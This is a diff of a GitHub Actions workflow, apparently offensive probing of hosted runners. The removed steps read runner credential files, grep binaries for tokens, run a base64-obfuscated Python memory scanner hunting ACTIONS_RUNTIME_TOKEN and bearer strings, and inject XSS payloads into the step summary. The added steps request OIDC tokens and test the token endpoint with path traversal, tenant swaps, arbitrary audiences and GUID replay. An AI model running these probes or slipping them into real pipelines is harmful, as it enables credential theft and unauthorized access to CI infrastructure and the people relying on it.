@@ -1,4 +1,4 @@
-name: ProcProbe
+name: OIDCProbe
 on:
   push:
     branches: [main]
@@ -9,33 +9,52 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - name: Deep runner investigation
+      - name: Capture OIDC token context
+        id: capture
         run: |
-          echo PPID=$PPID
-          echo === PIPELINE FOLDER ===
-          cat /home/runner/work/_PipelineMapping/*/PipelineFolder.json 2>/dev/null || echo not-found
-          echo === RUNNER TEMP FILES ===
-          find /home/runner/work/_temp/ -type f 2>/dev/null | head -20
-          echo === RUNNER CONFIG ===
-          cat /home/runner/actions-runner/.runner 2>/dev/null || echo not-found
-          cat /home/runner/actions-runner/.credentials 2>/dev/null || echo not-found
-          echo === PROVJOBD ===
-          ls -la /tmp/provjobd* 2>/dev/null || echo no-provjobd
-          strings /tmp/provjobd* 2>/dev/null | grep -iE 'token|secret|runtime|cache|bearer' | head -30 || echo no-matches
-          echo === HCA ===
-          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE 'ACTIONS_RUNTIME|bearer' | head -20 || echo no-matches
-          echo === MEMORY SCAN ===
-          python3 -c "import base64; exec(base64.b64decode('CmltcG9ydCBvcywgc3lzCnBpZCA9IG9zLmdldHBwaWQoKQprd3MgPSBbYiJBQ1RJT05TX1JVTlRJTUVfVE9LRU4iLCBiIkFDVElPTlNfQ0FDSEVfVVJMIiwgYiJfYXBpcy9hcnRpZmFjdGNhY2hlIiwgYiJiZWFyZXIgIl0KdHJ5OgogICAgbWFwcyA9IG9wZW4oZiIvcHJvYy97cGlkfS9tYXBzIikucmVhZGxpbmVzKCkKICAgIHByaW50KGYiUmVnaW9uczoge2xlbihtYXBzKX0iKQogICAgbWVtID0gb3BlbihmIi9wcm9jL3twaWR9L21lbSIsICJyYiIpCiAgICBmb3IgbGluZSBpbiBtYXBzOgogICAgICAgIHBhcnRzID0gbGluZS5zcGxpdCgpCiAgICAgICAgaWYgbGVuKHBhcnRzKSA8IDIgb3IgInIiIG5vdCBpbiBwYXJ0c1sxXTogY29udGludWUKICAgICAgICBzLGUgPSBbaW50KHgsMTYpIGZvciB4IGluIHBhcnRzWzBdLnNwbGl0KCItIildCiAgICAgICAgaWYgZS1zID4gMjAqMTAyNCoxMDI0OiBjb250aW51ZQogICAgICAgIHRyeToKICAgICAgICAgICAgbWVtLnNlZWsocykKICAgICAgICAgICAgZCA9IG1lbS5yZWFkKGUtcykKICAgICAgICAgICAgZm9yIGt3IGluIGt3czoKICAgICAgICAgICAgICAgIGlkeCA9IDAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgaWR4ID0gZC5maW5kKGt3LCBpZHgpCiAgICAgICAgICAgICAgICAgICAgaWYgaWR4IDwgMDogYnJlYWsKICAgICAgICAgICAgICAgICAgICBwcmludChmIltGT1VORF0ge2t3LmRlY29kZSgpfSBAIHtwYXJ0c1swXX0re2hleChpZHgpfSIpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZFttYXgoMCxpZHgtMjApOmlkeCszMDBdLmRlY29kZSgidXRmLTgiLCJyZXBsYWNlIikpCiAgICAgICAgICAgICAgICAgICAgaWR4ICs9IGxlbihrdykKICAgICAgICBleGNlcHQ6IHBhc3MKICAgIG1lbS5jbG9zZSgpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZXg6CiAgICBwcmludChmIkVycm9yOiB7ZXh9IikKcHJpbnQoIlNjYW4gZG9uZSIpCg==').decode())"
-          echo === ALL ACTIONS/GITHUB ENV VARS ===
-          env | grep -iE 'ACTIONS|GITHUB|RUNNER' | sort
-      - name: Step Summary XSS Test
+          echo OIDC_URL=$ACTIONS_ID_TOKEN_REQUEST_URL
+          echo OIDC_TOKEN_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}
+          echo ORCHESTRATION_ID=$ACTIONS_ORCHESTRATION_ID
+          # Save for later steps
+          echo "OIDC_URL=$ACTIONS_ID_TOKEN_REQUEST_URL" >> $GITHUB_ENV
+          echo "OIDC_REQUEST_TOKEN=$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> $GITHUB_ENV
+      - name: Probe OIDC URL variations
         run: |
-          echo '<img src=x onerror=alert(document.domain)>' >> $GITHUB_STEP_SUMMARY
-          echo '<svg/onload=alert(1)>' >> $GITHUB_STEP_SUMMARY
-          echo '<script>alert(1)</script>' >> $GITHUB_STEP_SUMMARY
-          echo done
-      - name: OIDC claims dump
+          BASE_URL=$OIDC_URL
+          BASE_URL_NO_AUD=$(echo $BASE_URL | sed 's/?api-version.*//')
+          echo === ORIGINAL URL REQUEST ===
+          ORIG=$(curl -sf -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${BASE_URL}&audience=api.github.com")
+          echo $ORIG | python3 -c "import json,sys; d=json.load(sys.stdin); t=d.get('value',''); p=t.split('.')[1] if len(t.split('.'))==3 else ''; import base64; b=p+'='*(-len(p)%4); claims=json.loads(base64.b64decode(b)); print('SUB:', claims.get('sub')); print('REF:', claims.get('ref')); print('JTI:', claims.get('jti'))" 2>/dev/null || echo ORIG_ERR
+          echo === DOUBLE SLASH PATH TRAVERSAL ===
+          TRAV_URL=$(echo $BASE_URL_NO_AUD | sed 's|/idtoken/|/idtoken/../idtoken/|')
+          STATUS=$(curl -sf -o /dev/null -w '%{http_code}' -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${TRAV_URL}?api-version=2.0&audience=api.github.com" 2>/dev/null || echo CURL_ERR)
+          echo TRAVERSAL_STATUS=$STATUS
+          echo === DIFFERENT TENANT (191->0) ===
+          TENANT0_URL=$(echo $BASE_URL_NO_AUD | sed 's|/191/|/0/|')
+          STATUS0=$(curl -sf -o /dev/null -w '%{http_code}' -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${TENANT0_URL}?api-version=2.0&audience=api.github.com" 2>/dev/null || echo CURL_ERR)
+          echo TENANT0_STATUS=$STATUS0
+          echo === DIFFERENT TENANT (191->192) ===
+          TENANT192_URL=$(echo $BASE_URL_NO_AUD | sed 's|/191/|/192/|')
+          STATUS192=$(curl -sf -o /dev/null -w '%{http_code}' -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${TENANT192_URL}?api-version=2.0&audience=api.github.com" 2>/dev/null || echo CURL_ERR)
+          echo TENANT192_STATUS=$STATUS192
+          echo === DIFFERENT API VERSION ===
+          STATUS_V3=$(curl -sf -o /dev/null -w '%{http_code}' -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${BASE_URL_NO_AUD}?api-version=3.0&audience=api.github.com" 2>/dev/null || echo CURL_ERR)
+          echo API_V3_STATUS=$STATUS_V3
+          echo === ARBITRARY AUDIENCE ===
+          ARB=$(curl -sf -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${BASE_URL_NO_AUD}?api-version=2.0&audience=s3.amazonaws.com" 2>/dev/null)
+          echo ARB_AUDIENCE_RESPONSE=$(echo $ARB | head -c 200)
+          echo === DIFFERENT STEP GUID (replay) ===
+          ORIG_GUID=$(echo $BASE_URL_NO_AUD | grep -oP '[0-9a-f-]{36}$')
+          FAKE_GUID='00000000-0000-0000-0000-000000000001'
+          REPLAY_URL=$(echo $BASE_URL_NO_AUD | sed "s|$ORIG_GUID|$FAKE_GUID|")
+          STATUS_REPLAY=$(curl -sf -o /dev/null -w '%{http_code}' -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${REPLAY_URL}?api-version=2.0&audience=api.github.com" 2>/dev/null || echo CURL_ERR)
+          echo REPLAY_STATUS=$STATUS_REPLAY
+      - name: Cross-run OIDC token request
         run: |
-          T=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api.github.com" | python3 -c "import json,sys; print(json.load(sys.stdin).get('value','ERR'))")
-          echo TOKEN_PREFIX=${T:0:30}
-          echo $T | cut -d. -f2 | python3 -c "import sys,base64,json; b=sys.stdin.read().strip(); b+='='*(-len(b)%4); [print(f'{k}: {v}') for k,v in sorted(json.loads(base64.b64decode(b)).items())]"
+          echo === USING STEP1 TOKEN IN STEP3 ===
+          T=$(curl -sf -H "Authorization: bearer $OIDC_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api.github.com")
+          echo CROSS_STEP_TOKEN_LEN=$(echo $T | python3 -c "import json,sys; print(len(json.load(sys.stdin).get('value','')))" 2>/dev/null)
+          echo NOTE: OIDC_URL env var is from step1 ACTIONS_ID_TOKEN_REQUEST_URL
+          echo CURRENT_STEP_URL=$ACTIONS_ID_TOKEN_REQUEST_URL
+          echo SAVED_STEP1_URL=$OIDC_URL
+          echo URLs_MATCH=$(test "$ACTIONS_ID_TOKEN_REQUEST_URL" = "$OIDC_URL" && echo YES || echo NO)
